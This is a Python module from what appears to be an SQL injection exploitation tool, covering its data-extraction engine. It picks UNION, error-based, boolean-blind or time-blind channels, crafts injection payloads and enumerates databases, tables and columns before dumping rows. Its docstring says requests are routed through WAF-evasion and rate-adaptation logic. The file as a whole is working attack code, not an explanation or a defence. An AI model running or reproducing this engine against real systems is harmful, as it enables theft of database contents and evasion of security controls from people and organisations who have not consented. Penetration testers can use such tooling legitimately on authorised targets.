"""Data-extraction engine: turn a confirmed injection into real data.

Given the findings for an injection point, the :class:`Extractor` picks the
fastest working data channel and exposes high-level enumeration:

    banner / current user / current db
    databases -> tables -> columns -> dump

Channels, fastest first:

* **UNION** - one request returns a full value via a reflected column.
* **error-based** - one request leaks a value inside a DB error message
  (chunked when the DBMS truncates, e.g. MySQL ``extractvalue``).
* **boolean blind** - binary-search each character against a truth oracle
  (~8 requests/char).
* **time blind** - same search, but the oracle is response latency.

Every request still flows through the :class:`AdaptiveController`, so
extraction inherits the same WAF-evasion and rate-adaptation as detection.
Choice of channel is validated by a self-test (read the banner); if the fast
channel returns garbage, the extractor transparently falls back to blind.
"""

from __future__ import annotations

import re
import string
from dataclasses import dataclass, field
from difflib import SequenceMatcher
from typing import Callable, Dict, List, Optional

from . import queries
from .adaptive import AdaptiveController
from .models import DBMS, Finding, InjectionPoint, Outcome, Technique
from .queries import Dialect, MARK, MARK_L, MARK_R
from .target import Target

_PRINTABLE = set(string.printable)


def _similarity(a: str, b: str) -> float:
    return SequenceMatcher(None, a[:6000], b[:6000]).ratio()


def _mostly_printable(s: str) -> bool:
    if not s:
        return False
    good = sum(1 for c in s if c in _PRINTABLE)
    return good / len(s) >= 0.9


# --------------------------------------------------------------------------- #
# Oracles
# --------------------------------------------------------------------------- #
class BooleanOracle:
    """Answers a SQL boolean condition by comparing response bodies."""

    def __init__(self, ctrl, target, point, finding: Finding) -> None:
        self.ctrl = ctrl
        self.target = target
        self.point = point
        self.prefix = finding.prefix
        self.suffix = finding.suffix
        # Reference bodies for a known-true and known-false condition.
        self._true_ref = self._send("1=1")
        self._false_ref = self._send("1=2")

    def _send(self, cond: str) -> str:
        payload = f"{self.prefix} AND ({cond}){self.suffix}"
        return self.ctrl.send(self.target, self.point, payload).response.text

    def ask(self, cond: str) -> bool:
        body = self._send(cond)
        return _similarity(body, self._true_ref) >= _similarity(body, self._false_ref)

    def usable(self) -> bool:
        # Only usable if true/false references are actually distinguishable.
        return _similarity(self._true_ref, self._false_ref) < 0.98


class TimeOracle:
    """Answers a condition via response latency (dialect time payloads)."""

    def __init__(self, ctrl, target, point, finding, dialect, delay=5) -> None:
        self.ctrl = ctrl
        self.target = target
        self.point = point
        self.prefix = finding.prefix
        self.suffix = finding.suffix
        self.dialect = dialect
        self.delay = delay

    def ask(self, cond: str) -> bool:
        payload = self.dialect.time_payload(
            self.prefix, self.suffix, cond, self.delay
        )
        if payload is None:
            return False
        resp = self.ctrl.send(self.target, self.point, payload).response
        return resp.elapsed >= self.delay - 1

    def usable(self) -> bool:
        return self.dialect.time_payload("", "", "1=1", self.delay) is not None


# --------------------------------------------------------------------------- #
# Channels
# --------------------------------------------------------------------------- #
class Channel:
    name = "channel"

    def read_str(self, scalar: str) -> str:
        raise NotImplementedError

    def read_int(self, expr: str) -> int:
        raw = self.read_str(expr)
        m = re.search(r"-?\d+", raw or "")
        return int(m.group(0)) if m else 0


class BlindChannel(Channel):
    """Character-by-character extraction via a boolean/time oracle."""

    def __init__(self, oracle, dialect: Dialect, max_len: int = 4096) -> None:
        self.name = "boolean-blind" if isinstance(oracle, BooleanOracle) else "time-blind"
        self.oracle = oracle
        self.d = dialect
        self.max_len = max_len

    def _len(self, scalar: str) -> int:
        length_expr = self.d.length(scalar)
        hi = 8
        while self.oracle.ask(f"{length_expr}>{hi}") and hi < self.max_len:
            hi *= 2
        lo = 0
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.oracle.ask(f"{length_expr}>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _char(self, scalar: str, pos: int) -> str:
        target = self.d.ascii(self.d.substr(scalar, pos))
        lo, hi = 0, 127
        if self.oracle.ask(f"{target}>127"):
            lo, hi = 128, 255
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle.ask(f"{target}>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if lo > 0 else ""

    def read_str(self, scalar: str) -> str:
        n = self._len(scalar)
        if n <= 0:
            return ""
        return "".join(self._char(scalar, i) for i in range(1, n + 1))

    def read_int(self, expr: str) -> int:
        hi = 8
        while self.oracle.ask(f"({expr})>{hi}") and hi < 10 ** 9:
            hi *= 2
        lo = 0
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.oracle.ask(f"({expr})>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        return lo


class UnionChannel(Channel):
    """Direct extraction through a reflected UNION column."""

    name = "union"

    def __init__(self, ctrl, target, point, finding, dialect) -> None:
        self.ctrl = ctrl
        self.target = target
        self.point = point
        self.prefix = finding.prefix
        self.suffix = finding.suffix
        self.d = dialect
        self.columns = finding.columns or 1
        self.slot: Optional[int] = None

    def setup(self) -> bool:
        # Put a distinct token in each column; see which reflects.
        cols = [self.d.str_literal(f"{MARK}{i}{MARK}") for i in range(self.columns)]
        payload = f"{self.prefix} UNION SELECT {','.join(cols)}{self.suffix}"
        resp = self.ctrl.send(self.target, self.point, payload).response
        if resp.outcome == Outcome.NETWORK_ERROR:
            return False
        for i in range(self.columns):
            if f"{MARK}{i}{MARK}" in resp.text:
                self.slot = i
                return True
        return False

    def read_str(self, scalar: str) -> str:
        if self.slot is None:
            return ""
        cols = ["NULL"] * self.columns
        cols[self.slot] = self.d.marker(scalar)
        payload = f"{self.prefix} UNION SELECT {','.join(cols)}{self.suffix}"
        resp = self.ctrl.send(self.target, self.point, payload).response
        m = re.search(re.escape(MARK_L) + r"(.*?)" + re.escape(MARK_R), resp.text, re.S)
        return m.group(1) if m else ""


class ErrorChannel(Channel):
    """Extraction via values leaked inside DB error messages."""

    name = "error-based"

    def __init__(self, ctrl, target, point, finding, dialect) -> None:
        self.ctrl = ctrl
        self.target = target
        self.point = point
        self.prefix = finding.prefix
        self.suffix = finding.suffix
        self.d = dialect

    def _leak(self, inner: str) -> str:
        payload = self.d.error_payload(self.prefix, self.suffix, inner)
        if payload is None:
            return ""
        resp = self.ctrl.send(self.target, self.point, payload).response
        return self.d.error_parse(resp.text) or ""

    def read_str(self, scalar: str) -> str:
        chunk = self.d.error_chunk
        if not chunk:
            return self._leak(scalar)
        out, pos = "", 1
        while True:
            piece = self._leak(self.d.mid(scalar, pos, chunk))
            out += piece
            if len(piece) < chunk:
                break
            pos += chunk
            if pos > 4096:
                break
        return out


# --------------------------------------------------------------------------- #
# Extractor
# --------------------------------------------------------------------------- #
@dataclass
class DumpResult:
    db: str
    table: str
    columns: List[str]
    rows: List[Dict[str, str]] = field(default_factory=list)


class Extractor:
    def __init__(
        self,
        ctrl: AdaptiveController,
        target: Target,
        point: InjectionPoint,
        findings: List[Finding],
        dbms: DBMS = DBMS.UNKNOWN,
        delay: int = 5,
        max_rows: int = 200,
        on_event: Optional[Callable[[str], None]] = None,
    ) -> None:
        self.ctrl = ctrl
        self.target = target
        self.point = point
        self.findings = findings
        self.delay = delay
        self.max_rows = max_rows
        self.on_event = on_event or (lambda _m: None)

        self.dbms = dbms if dbms is not DBMS.UNKNOWN else self._first_dbms()
        self.dialect: Optional[Dialect] = queries.for_dbms(self.dbms)
        self.channel: Optional[Channel] = None
        self._oracle = None

    # -- setup ---------------------------------------------------------- #
    def _first_dbms(self) -> DBMS:
        for f in self.findings:
            if f.dbms is not DBMS.UNKNOWN:
                return f.dbms
        return DBMS.UNKNOWN

    def _find(self, tech: Technique) -> Optional[Finding]:
        for f in self.findings:
            if f.technique == tech:
                return f
        return None

    def _build_oracle(self):
        bf = self._find(Technique.BOOLEAN)
        if bf is not None:
            o = BooleanOracle(self.ctrl, self.target, self.point, bf)
            if o.usable():
                return o
        tf = self._find(Technique.TIME)
        if tf is not None and self.dialect is not None:
            o = TimeOracle(self.ctrl, self.target, self.point, tf, self.dialect, self.delay)
            if o.usable():
                return o
        return None

    def prepare(self) -> bool:
        """Resolve dialect + fastest working channel. Returns readiness."""
        self._oracle = self._build_oracle()

        # Resolve DBMS/dialect if still unknown, using the oracle.
        if self.dialect is None and self._oracle is not None:
            self._resolve_dialect_via_oracle()
        if self.dialect is None:
            self.on_event("extraction: unsupported/unknown DBMS")
            return False

        # Try channels fastest-first, validating each with a banner read.
        for channel in self._candidate_channels():
            self.channel = channel
            probe = self._safe_read(self.dialect.banner_expr)
            if _mostly_printable(probe):
                self.on_event(f"extraction channel: {channel.name} (banner: {probe[:40]!r})")
                self._banner_cache = probe
                return True
        self.channel = None
        self.on_event("extraction: no working data channel")
        return False

    def _candidate_channels(self) -> List[Channel]:
        chans: List[Channel] = []
        uf = self._find(Technique.UNION)
        if uf is not None and self.dialect is not None:
            uc = UnionChannel(self.ctrl, self.target, self.point, uf, self.dialect)
            if uc.setup():
                chans.append(uc)
        ef = self._find(Technique.ERROR)
        if ef is not None and self.dialect is not None and self.dialect.supports_error:
            chans.append(ErrorChannel(self.ctrl, self.target, self.point, ef, self.dialect))
        if self._oracle is not None:
            chans.append(BlindChannel(self._oracle, self.dialect))
        return chans

    def _resolve_dialect_via_oracle(self) -> None:
        for dbms, dialect in queries._DIALECTS.items():
            expr = dialect.length(dialect.banner_expr)
            try:
                if self._oracle.ask(f"{expr}>0") and not self._oracle.ask(f"{expr}>100000"):
                    self.dbms, self.dialect = dbms, dialect
                    self.on_event(f"resolved DBMS via oracle: {dbms.value}")
                    return
            except Exception:
                continue

    def _safe_read(self, scalar: str) -> str:
        try:
            return self.channel.read_str(scalar)
        except Exception as exc:  # a bad channel shouldn't abort the scan
            self.on_event(f"channel read error: {exc}")
            return ""

    # -- high-level API ------------------------------------------------- #
    def banner(self) -> str:
        if getattr(self, "_banner_cache", None):
            return self._banner_cache
        return self._safe_read(self.dialect.banner_expr)

    def current_user(self) -> Optional[str]:
        if not self.dialect.current_user_expr:
            return None
        return self._safe_read(self.dialect.current_user_expr) or None

    def current_db(self) -> Optional[str]:
        if not self.dialect.current_db_expr:
            return None
        return self._safe_read(self.dialect.current_db_expr) or None

    def _enumerate(self, source) -> List[str]:
        select_expr, from_where = source
        n = min(self.channel.read_int(self.dialect.scalar_count(from_where)), self.max_rows)
        out = []
        for i in range(n):
            val = self._safe_read(self.dialect.scalar_nth(select_expr, from_where, i))
            out.append(val)
        return out

    def databases(self) -> List[str]:
        return [d for d in self._enumerate(self.dialect.databases_source()) if d]

    def tables(self, db: str) -> List[str]:
        return [t for t in self._enumerate(self.dialect.tables_source(db)) if t]

    def columns(self, db: str, table: str) -> List[str]:
        return [c for c in self._enumerate(self.dialect.columns_source(db, table)) if c]

    def dump(self, db: str, table: str, columns: Optional[List[str]] = None) -> DumpResult:
        cols = columns or self.columns(db, table)
        result = DumpResult(db=db, table=table, columns=cols)
        if not cols:
            return result
        select_expr, from_where = self.dialect.rows_source(db, table, cols)
        n = min(self.channel.read_int(self.dialect.scalar_count(from_where)), self.max_rows)
        for i in range(n):
            raw = self._safe_read(self.dialect.scalar_nth(select_expr, from_where, i))
            values = raw.split("|")
            row = {c: (values[j] if j < len(values) else "") for j, c in enumerate(cols)}
            result.rows.append(row)
        return result
